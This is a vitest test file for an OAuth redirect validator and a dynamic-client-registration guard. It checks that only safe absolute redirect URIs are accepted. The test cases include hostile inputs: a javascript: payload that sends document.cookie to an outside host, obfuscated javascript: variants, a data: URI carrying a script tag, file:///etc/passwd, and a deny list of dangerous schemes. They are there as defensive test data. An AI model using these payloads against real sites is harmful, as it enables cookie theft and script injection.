/**
 * Which redirect targets an OAuth client may have (../oauthRedirect.ts): the
 * consent page follows any absolute URL but the denied schemes, and client
 * registration refuses a client naming one before better-auth stores it.
 */

import { describe, expect, it } from 'vitest';
import {
  DCR_REGISTER_PATH,
  DENIED_REDIRECT_SCHEMES,
  isAllowedRedirectTarget,
  rejectUnsafeDynamicClientRegistration,
} from '../oauthRedirect.ts';

describe('isAllowedRedirectTarget', () => {
  it.each([
    ['an https callback', 'https://claude.ai/api/mcp/auth_callback?code=abc&state=s'],
    ['a loopback http callback', 'http://127.0.0.1:52111/callback'],
    ['a localhost callback', 'http://localhost:33418/callback?code=abc'],
    ['a native app scheme', 'cursor://anysphere.cursor-retrieval/oauth/callback?code=abc'],
    ['a reverse-domain native scheme', 'com.example.app:/oauth2redirect?code=abc'],
    ['an error redirect', 'https://client.example/cb?error=access_denied&state=s'],
  ])('follows %s', (_label, target) => {
    expect(isAllowedRedirectTarget(target)).toBe(true);
  });

  it('denies exactly the five schemes', () => {
    expect(DENIED_REDIRECT_SCHEMES).toEqual([
      'javascript:',
      'data:',
      'vbscript:',
      'blob:',
      'file:',
    ]);
  });

  it.each([
    ['javascript:', "javascript:fetch('//x/'+document.cookie)"],
    ['javascript: in mixed case', 'JaVaScRiPt:alert(1)'],
    ['javascript: split by a tab', 'java\tscript:alert(1)'],
    ['javascript: after leading spaces', '  javascript:alert(1)'],
    ['data:', 'data:text/html,<script>alert(1)</script>'],
    ['vbscript:', 'vbscript:msgbox(1)'],
    ['blob:', 'blob:https://app.classmoji.io/1b4e28ba-2fa1-11d2-883f-0016d3cca427'],
    ['file:', 'file:///etc/passwd'],
  ])('refuses %s', (_label, target) => {
    expect(isAllowedRedirectTarget(target)).toBe(false);
  });

  it.each([
    ['a relative path', '/settings'],
    ['a scheme-relative URL', '//elsewhere.example/cb'],
    ['a bare word', 'callback'],
    ['an empty string', ''],
  ])('refuses %s (a redirect URI is absolute)', (_label, target) => {
    expect(isAllowedRedirectTarget(target)).toBe(false);
  });

  it.each([[null], [undefined], [42], [{}], [['https://x.example']]])(
    'refuses a non-string (%o)',
    target => {
      expect(isAllowedRedirectTarget(target)).toBe(false);
    }
  );
});

describe('rejectUnsafeDynamicClientRegistration', () => {
  const ORIGIN = 'http://localhost:3000';
  const register = (body: unknown, path = DCR_REGISTER_PATH) =>
    new Request(`${ORIGIN}${path}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: typeof body === 'string' ? body : JSON.stringify(body),
    });

  it('lets a client with only followed redirect URIs through', async () => {
    const request = register({
      redirect_uris: ['http://127.0.0.1:33418/callback', 'cursor://anysphere.cursor-retrieval/cb'],
    });
    expect(await rejectUnsafeDynamicClientRegistration(request)).toBeNull();
    // The body is still there for better-auth.
    expect(await request.json()).toMatchObject({ redirect_uris: expect.any(Array) });
  });

  it.each([['javascript:alert(1)'], ['blob:https://x.example/1'], ['file:///x'], ['/relative']])(
    'refuses a client naming %s among its redirect URIs',
    async uri => {
      const res = await rejectUnsafeDynamicClientRegistration(
        register({ redirect_uris: ['https://ok.example/cb', uri] })
      );
      expect(res?.status).toBe(400);
      expect(await res!.json()).toMatchObject({ error: 'invalid_redirect_uri' });
    }
  );

  it('refuses a non-string redirect URI', async () => {
    const res = await rejectUnsafeDynamicClientRegistration(register({ redirect_uris: [42] }));
    expect(res?.status).toBe(400);
  });

  it.each([
    ['no redirect_uris', { client_name: 'x' }],
    ['redirect_uris not a list', { redirect_uris: 'javascript:alert(1)' }],
    ['a body that is not JSON', 'not json'],
  ])('leaves %s to better-auth', async (_label, body) => {
    expect(await rejectUnsafeDynamicClientRegistration(register(body))).toBeNull();
  });

  // The 1.4 path is mapped to the registration path before the guard runs
  // (the webapp's api.auth.$; its own test pins the order).
  it.each([
    ['/api/auth/oauth2/authorize'],
    ['/api/auth/mcp/register'],
    ['/api/auth/sign-up/email'],
  ])('does not look at %s (only the registration path)', async path => {
    expect(
      await rejectUnsafeDynamicClientRegistration(
        register({ redirect_uris: ['javascript:alert(1)'] }, path)
      )
    ).toBeNull();
  });
});
